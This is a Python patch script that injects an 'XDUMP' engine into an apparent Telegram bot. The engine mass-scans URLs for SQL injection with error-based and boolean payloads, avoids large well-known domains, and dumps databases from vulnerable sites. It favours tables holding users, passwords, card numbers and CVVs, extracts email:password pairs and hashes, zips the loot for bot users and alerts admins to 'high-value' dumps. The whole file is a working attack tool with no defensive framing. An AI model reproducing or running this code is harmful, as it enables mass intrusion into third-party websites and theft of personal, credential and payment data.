import sys, os
cands=[sys.argv[1]] if len(sys.argv)>1 else ["new.py","test.py","bot.py"]
fn=None
for c in cands:
    if os.path.exists(c): fn=c; break
if not fn:
    print("NO MAIN FILE"); sys.exit(1)
src=open(fn,"r",encoding="utf-8").read()
if "# XDUMP-v1" in src:
    print("ALREADY PATCHED:",fn); sys.exit(0)
r1a="ERROR_SIGS=["; r1b="def turbo_hunt("
r2a="def extract_db(db,t):"; r2b="# ============ DORK/KEYWORD GEN ============"
for m in (r1a,r1b,r2a,r2b):
    if m not in src: print("MARKER NOT FOUND:",m); sys.exit(1)
R1='''ERROR_SIGS=["you have an error in your sql","right syntax to use","check the manual that corresponds","mysql_fetch_array","mysql_fetch_assoc","mysql_num_rows","mysqli_num_rows","warning: mysql_","warning: mysqli_","mariadb server","pg_query(","pg_exec(","postgresql query failed","sqlite3::query","sqlite_query(","ora-0","oracle error","pl/sql:","odbc sql server driver","microsoft jet database","jet database engine","unclosed quotation mark","unterminated string literal","quoted string not properly terminated","invalid input syntax for type","syntax error at or near","microsoft vb","vbscript runtime error","conversion failed when converting","supplied argument is not a valid","fatal error: uncaught pdoexception","db2 sql error","informix","division by zero"]
WAF_SIGS=["cloudflare","cf-ray","sucuri","wordfence","akamai","incapsula","imperva","attention required","access denied","blocked by","captcha verify","request unsuccessful"]
BIGDOM=["amazon","flipkart","google","youtube","facebook","instagram","twitter","wikipedia","apple","microsoft","etsy","ebay","walmart","target","aliexpress","alibaba","shopify","paypal","stripe","github"]
SCAN_V=3
def build_url(parsed,nq): return urlunparse((parsed.scheme,parsed.netloc,parsed.path,"",urlencode(nq,doseq=True),""))
ERR_PAY=["'","\\"","')","'-- ","\\"-- ","')-- ","' AND extractvalue(1,concat(0x7e,version(),0x7e))-- ","' AND updatexml(1,concat(0x7e,version(),0x7e))-- ","' AND 1=CONVERT(int,(select @@version))-- ","' AND 1=CAST((select version()) AS INT)-- "]
async def a_scan(s,url,to):
    # XDUMP-v1
    try:
        net=urlparse(url).netloc.lower()
        if any(b in net for b in BIGDOM): return None
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        params=list(query.keys())[:2]; base_c=None
        for pi,param in enumerate(params):
            orig=(query[param] or [""])[0]
            for val in ERR_PAY:
                nq=query.copy(); nq[param]=[orig+val]
                t,_=await a_get_fb(s,build_url(parsed,nq),to=to)
                if not t: continue
                low=t.lower()
                m=re.search(r"~([a-z0-9._\\- ]{3,60})~",low)
                if m and re.search(r"\\d",m.group(1)): return {"url":url,"param":param,"payload":val,"sig":"error-echo:"+m.group(1),"conf":3}
                hit=None
                for sig in ERROR_SIGS:
                    if sig in low: hit=sig; break
                if hit:
                    if base_c is None:
                        bt,_=await a_get_fb(s,url,to=to); base_c=(bt or "").lower()
                    if hit not in base_c: return {"url":url,"param":param,"payload":val,"sig":hit,"conf":3}
            if pi==0 and orig:
                bt,_=await a_get_fb(s,url,to=to)
                if bt:
                    l0=len(bt)
                    nq1=query.copy(); nq1[param]=[orig+"' AND '1'='1"]
                    nq2=query.copy(); nq2[param]=[orig+"' AND '1'='2"]
                    t1,_=await a_get_fb(s,build_url(parsed,nq1),to=to)
                    t2,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    t3,_=await a_get_fb(s,build_url(parsed,nq2),to=to)
                    if t1 and t2 and t3:
                        l1,l2,l3=len(t1),len(t2),len(t3)
                        if abs(l2-l3)<=max(10,int(l2*0.02)) and abs(l1-l2)>=max(150,int(l1*0.2)) and abs(l1-l0)<=max(60,int(l0*0.05)):
                            return {"url":url,"param":param,"payload":"boolean-based","sig":"boolean-stable","conf":2}
        return None
    except: return None
def turbo_inject(cid,uid,mid,jid,urls,mode,threads=15):
    # XDUMP-v1
    try:
        vuln=[]; nonev=[]; done=[0]; last=[0.0]; details=[]; reqs=[0]; wafed=[0]; t0=time.time(); since_save=[0]
        bump("inject"); bumpU(uid,"inject")
        vc=load_json(VULN_CACHE,{}); now=time.time(); to_test=[]
        to=min(max(mode["timeout"],6),10)
        for u in urls:
            e=vc.get(u)
            if e and e.get("sv")==SCAN_V and now-e.get("t",0)<7*86400:
                if e.get("v"): vuln.append({"url":u})
                else: nonev.append(u)
                done[0]+=1
            else: to_test.append(u)
        try: bot.edit_message_text(f"💉 XDUMP INJECTOR\\n{LINE}\\n🧊 {len(to_test)} fresh | 🧵 {threads} | ⏱️ {to}s",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
        except: pass
        HSEM={}
        async def run():
            conn=aiohttp.TCPConnector(limit=threads+10,limit_per_host=20,ssl=False,ttl_dns_cache=300,enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn,headers=HDR,timeout=aiohttp.ClientTimeout(total=to)) as s:
                sem=asyncio.Semaphore(threads)
                def hsem(h):
                    if h not in HSEM: HSEM[h]=asyncio.Semaphore(2)
                    return HSEM[h]
                async def task(u):
                    async with sem:
                        reqs[0]+=1
                        async with hsem(urlparse(u).netloc):
                            return await a_scan(s,u,to)
                for i in range(0,len(to_test),INJ_BATCH):
                    if stopped(jid): break
                    batch=to_test[i:i+INJ_BATCH]
                    res=await asyncio.gather(*[task(u) for u in batch],return_exceptions=True)
                    for u,r in zip(batch,res):
                        if isinstance(r,dict) and r.get("waf"):
                            wafed[0]+=1; nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                        elif isinstance(r,dict) and r:
                            vuln.append(r); details.append(r); vc[u]={"v":1,"t":now,"sv":SCAN_V}
                        else: nonev.append(u); vc[u]={"v":0,"t":now,"sv":SCAN_V}
                    done[0]+=len(batch); since_save[0]+=len(batch)
                    if since_save[0]>=2000: save_json(VULN_CACHE,vc); since_save[0]=0
                    now2=time.time()
                    if now2-last[0]>2:
                        last[0]=now2
                        rps=round(reqs[0]/max(1,now2-t0),1)
                        try: bot.edit_message_text(f"💉 XDUMP INJECTOR 💪\\n{LINE}\\n{bar(done[0],len(urls))} {pct(done[0],len(urls))}% ({done[0]}/{len(urls)})\\n🩸 Vuln: {len(vuln)} | 🛡️ Safe: {len(nonev)} | 🧱 WAF: {wafed[0]}\\n⚡ {rps} r/s | 🧵 {threads} | 🧊 batch {i//INJ_BATCH+1}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                        except: pass
        _run_on_loop(run())
        if len(vc)>20000: vc=dict(sorted(vc.items(),key=lambda kv:-kv[1].get("t",0))[:10000])
        save_json(VULN_CACHE,vc); clear_markup(cid,mid)
        vurls=[v["url"] for v in vuln]
        if vurls: send_doc(cid,("\\n".join(vurls)+"\\n").encode(),"vulnerable_urls.txt",uid)
        if nonev: send_doc(cid,("\\n".join(nonev)+"\\n").encode(),"none_vulnerable_urls.txt",uid)
        if details:
            det="\\n".join(f"URL: {d['url']}\\nParam: {d['param']}\\nPayload: {d['payload']}\\nSig: {d['sig']} | Conf: {d.get('conf',2)}\\n{'-'*40}" for d in details)
            send_doc(cid,(det+"\\n").encode(),"vuln_details.txt",uid)
            send_doc(cid,html_report("Vulnerability Report",details).encode(),"report.html",uid)
        if vurls:
            LAST.setdefault(uid,{})["vuln"]=vurls
            mk=types.InlineKeyboardMarkup(); mk.add(sbtn("🩸 ➡️ Dumper","pipe:data","danger"))
            bot.send_message(cid,f"💉 INJECTOR DONE {'⏹️ PARTIAL' if stopped(jid) else '🎉'}\\n{LINE}\\n🩸 {len(vuln)} | 🛡️ {len(nonev)} | 🧱 {wafed[0]}",reply_markup=mk)
        else: bot.send_message(cid,f"💉 INJECTOR DONE\\n{LINE}\\n🩸 0 | 🛡️ {len(nonev)} | 🧱 {wafed[0]}\\n{done[0]}/{len(urls)} tested")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 INJECT BUG:\\n{type(e).__name__}: {e}")
        except: pass
'''
R2='''def sane_idlist(s,max_tok=400):
    toks=[t.strip() for t in s.split(",") if t.strip()]
    if not toks or len(toks)>max_tok: return False
    ok=sum(1 for t in toks if re.match(r"^[A-Za-z0-9_$]+$",t) and len(t)<=64)
    return ok>=max(1,int(len(toks)*0.8))
def extract_db(db,t):
    # XDUMP-v1
    for rx in EXTRACT[db]:
        m=re.search(rx,t,re.I)
        if m:
            d=m.group(1).strip()
            if len(d)>300: continue
            if re.search(r"[<>={}();\\"']",d): continue
            if not (re.search(r"[A-Za-z]",d) or re.search(r"\\d+\\.\\d+",d)): continue
            return d
    return None
def sqli_fetch(url,param,query,db,ph,to,strict=False):
    parsed=urlparse(url); bq=parse_qs(parsed.query,keep_blank_values=True)
    for f in WRAP[db]:
        nq=bq.copy(); nq[param]=[f(query)]
        t,s=_get(build_url(parsed,nq),ph,to)
        if t:
            d=extract_db(db,t)
            if d:
                if strict and not re.search(r"\\d",d): continue
                return d
    return None
def q_dbs(db):
    return {"mysql":"select group_concat(schema_name) from information_schema.schemata","mssql":"select string_agg(name, ',') from sys.databases","pg":"select string_agg(datname, ',') from pg_database","oracle":"select listagg(username, ',') within group (order by username) from (select username from all_users where rownum<=50)"}[db]
SYSDB=["information_schema","mysql","performance_schema","sys","pg_catalog","pg_toast","master","tempdb","model","msdb"]
def q_tables(db,dbname=None):
    if db=="mysql" and dbname: return "select group_concat(table_name) from information_schema.tables where table_schema='"+esc(dbname)+"'"
    return {"mysql":"select group_concat(table_name) from information_schema.tables where table_schema=database()","mssql":"select string_agg(name, ',') from sys.tables","pg":"select string_agg(table_name, ',') from information_schema.tables where table_schema='public'","oracle":"select listagg(table_name, ',') within group (order by table_name) from user_tables"}[db]
def q_cols(db,t):
    if db=="mysql": return "select group_concat(column_name) from information_schema.columns where table_name="+hexify(t)
    if db=="mssql": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
    if db=="pg": return "select string_agg(column_name, ',') from information_schema.columns where table_name='"+esc(t)+"'"
    return "select listagg(column_name, ',') within group (order by column_name) from user_tab_columns where table_name='"+esc(t)+"'"
COL_PRI=["user","name","email","mail","pass","pwd","login","admin","cc","card","cvv","exp","phone","tel"]
def sort_cols(cols):
    def rank(c):
        c=c.lower()
        for i,k in enumerate(COL_PRI):
            if k in c: return i
        return 99
    return sorted(cols,key=rank)
def q_rows_chunk(db,t,cols,rows,ph,to,url,param):
    if db!="mysql":
        q={"mssql":"select top "+str(rows)+" "+",".join(cols)+" from "+esc(t),
           "pg":"select "+",".join(cols)+" from "+esc(t)+" limit "+str(rows),
           "oracle":"select "+",".join(cols)+" from "+esc(t)+" where rownum<="+str(rows)}[db]
        r=sqli_fetch(url,param,q,db,ph,to)
        return [r] if r else []
    all_rows=[]; chunk=50
    for off in range(0,rows,chunk):
        inner="select "+",".join(cols)+" from `"+t+"` limit "+str(chunk)+" offset "+str(off)
        q="select group_concat(concat_ws(0x3a,"+",".join(cols)+") separator 0x7c) from ("+inner+") vv"
        r=sqli_fetch(url,param,q,db,ph,to)
        if not r: break
        all_rows.extend(r.split("|"))
        if len(r.split("|"))<chunk: break
    return all_rows
JUICY=["user","admin","login","pass","customer","order","account","member","client","staff","cred","cc","card","cvv","email","mail"]
MAILK=["mail","user","login","account"]; PASSK=["pass","pwd","hash","secret","token"]
def dump_one_url(url,ph,mode,juicy,jid):
    # XDUMP-v1
    try:
        if stopped(jid): return None
        t_start=time.time()
        parsed=urlparse(url); query=parse_qs(parsed.query,keep_blank_values=True)
        if not query: return None
        param=None; db=None; ver=None
        for p in list(query.keys())[:3]:
            for d in VQ:
                v=sqli_fetch(url,p,VQ[d],d,ph,mode["timeout"],True)
                if v: param,db,ver=p,d,v; break
            if param: break
        if not param: return None
        res={"url":url,"db":db,"info":{"version":ver},"tables":{},"creds":[]}
        dbscsv=sqli_fetch(url,param,q_dbs(db),db,ph,mode["timeout"])
        dbs=[x for x in (dbscsv or "").split(",") if x and x.strip().lower() not in SYSDB] if dbscsv else []
        if not dbs: dbs=[None]
        total=0
        for dbname in dbs[:6]:
            if stopped(jid) or time.time()-t_start>DUMP_DEADLINE: break
            tcsv=sqli_fetch(url,param,q_tables(db,dbname),db,ph,mode["timeout"])
            if not tcsv or not sane_idlist(tcsv): continue
            tables=[t for t in tcsv.split(",") if t]
            total+=len(tables)
            if juicy: tables=[t for t in tables if any(k in t.lower() for k in JUICY)] or tables
            for t in tables[:mode["tables"]]:
                if stopped(jid) or time.time()-t_start>DUMP_DEADLINE: break
                ccsv=sqli_fetch(url,param,q_cols(db,t),db,ph,mode["timeout"])
                if not ccsv or not sane_idlist(ccsv): continue
                cols=sort_cols([c for c in ccsv.split(",") if c])
                if not cols: continue
                res["tables"][t]={"columns":cols,"rows":q_rows_chunk(db,t,cols,mode["rows"],ph,mode["timeout"],url,param)}
                if db=="mysql":
                    mailc=next((c for c in cols if any(k in c.lower() for k in MAILK)),None)
                    passc=next((c for c in cols if any(k in c.lower() for k in PASSK)),None)
                    if mailc and passc:
                        cq="select group_concat(concat_ws(0x3a,"+mailc+","+passc+") separator 0x7c) from `"+t+"` limit 1000"
                        cr=sqli_fetch(url,param,cq,db,ph,mode["timeout"])
                        if cr: res["creds"].extend([x.strip() for x in cr.split("|") if ":" in x and len(x)<200])
        res["info"]["total_tables"]=str(total)
        return res
    except: return None
def build_zip(dumps):
    bio=io.BytesIO()
    allcreds=set(); allhash=set()
    for d in dumps:
        for c in d.get("creds",[]): allcreds.add(c)
        for tn,td in d.get("tables",{}).items():
            for row in td["rows"]:
                allhash.update(re.findall(r"\\b[0-9a-f]{32,64}\\b",row))
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_DEFLATED) as z:
        if allcreds: z.writestr("dump/creds_all.txt","\\n".join(sorted(allcreds))+"\\n")
        if allhash: z.writestr("dump/hashes.txt","\\n".join(sorted(allhash))+"\\n")
        for d in dumps:
            host=urlparse(d["url"]).netloc.replace(":","_") or "site"
            base="dump/"+host+"/"
            z.writestr(base+"info.txt","URL: "+d["url"]+"\\nDB: "+d.get("db","?")+"\\n"+"\n".join(k+": "+v for k,v in d["info"].items())+"\\n")
            z.writestr(base+"tables.txt","\\n".join(d["tables"].keys())+"\\n")
            if d.get("creds"): z.writestr(base+"creds.txt","\\n".join(d["creds"])+"\\n")
            for tn,td in d["tables"].items():
                safe=re.sub(r"[^A-Za-z0-9_\\-]","_",tn)[:40]
                z.writestr(base+"table_"+safe+".txt","TABLE: "+tn+"\\nCOLUMNS: "+", ".join(td["columns"])+"\\n"+"\n".join(td["rows"])+"\\n")
    bio.seek(0)
    return bio.getvalue()
def count_loot(dumps):
    em=0; ha=0
    for d in dumps:
        em+=len(d.get("creds",[]))
        for tn,td in d.get("tables",{}).items():
            for row in td["rows"]:
                em+=len(re.findall(r"[\\w.+-]+@[\\w-]+\\.\\w+",row)); ha+=len(re.findall(r"\\b[0-9a-f]{32}\\b",row))
    return em,ha
DUMP_CACHE=P("dump_cache.json")
def run_datadump(cid,uid,mid,jid,urls,ph_old,mode,juicy):
    # XDUMP-v1
    try:
        ph=PH(uprox(uid)); dumps=[]; done=[0]; last=[0.0]; cur=["-"]; cached=[0]
        bump("dump"); bumpU(uid,"dump")
        dc=load_json(DUMP_CACHE,{}); now=time.time(); to_dump=[]
        for u in urls:
            if dc.get(u) and now-dc[u]<7*86400: cached[0]+=1
            else: to_dump.append(u)
        def edit(force=False):
            now=time.time()
            if force or now-last[0]>3:
                last[0]=now
                try: bot.edit_message_text(f"🩸 XDUMP DUMPER\\n{LINE}\\n{bar(done[0],len(to_dump))} {pct(done[0],len(to_dump))}% ({done[0]}/{len(to_dump)})\\n💾 {len(dumps)} | 🔐 {sum(len(d.get('creds',[])) for d in dumps)} | {cur[0]}",chat_id=cid,message_id=mid,reply_markup=stop_markup(jid))
                except: pass
        def on_done(f,u):
            cur[0]=urlparse(u).netloc[:25]
            r=f.result()
            if r and (r.get("tables") or r.get("info")): dumps.append(r)
            dc[u]=now
            done[0]+=1; edit()
        run_jobs(lambda u:dump_one_url(u,ph,mode,juicy,jid),to_dump,jid,min(DUMP_WORKERS,mode["workers"]),on_done)
        if len(dc)>20000: dc=dict(sorted(dc.items(),key=lambda kv:-kv[1])[:10000])
        save_json(DUMP_CACHE,dc)
        clear_markup(cid,mid); edit(True)
        juicy_found=[]
        for dmp in dumps:
            for tn in dmp["tables"]:
                if any(k in tn.lower() for k in JUICY): juicy_found.append(f"{urlparse(dmp['url']).netloc} → {tn}")
        em,ha=count_loot(dumps)
        if juicy_found or em:
            for a in admins():
                try: bot.send_message(a,f"🚨 HIGH-VALUE DUMP\\n{LINE}\\n👤 {uid}\\n📧 {em} | 🔑 {ha}\\n"+"\n".join(juicy_found[:10]))
                except: pass
        if dumps:
            send_doc(cid,build_zip(dumps),"data_dump.zip",uid)
            rows=[{"url":d["url"],"type":"DB-DUMP "+d.get("db","?"),"param":",".join(d["tables"].keys()),"sig":str(sum(len(t["rows"]) for t in d["tables"].values()))+" rows"} for d in dumps]
            send_doc(cid,html_report("Dump Report",rows).encode(),"dump_report.html",uid)
            bot.send_message(cid,f"🩸 DUMPER DONE\\n{LINE}\\n💾 {len(dumps)} sites | 📋 {sum(len(d['tables']) for d in dumps)} tables\\n📧 {em} | 🔑 {ha} | ⚡ {cached[0]} cached")
        else: bot.send_message(cid,f"😭 Koi naya data nahi. ⚡ {cached[0]} cached skips.")
    except Exception as e:
        try: bot.send_message(cid,f"🐞 DUMP BUG:\\n{type(e).__name__}: {e}")
        except: pass
'''
a=src.index(r1a); b=src.index(r1b)
src=src[:a]+R1+"\n"+src[b:]
a=src.index(r2a); b=src.index(r2b)
src=src[:a]+R2+"\n"+src[b:]
open(fn,"w",encoding="utf-8").write(src)
print("PATCHED",fn,"- xdump engine welded")
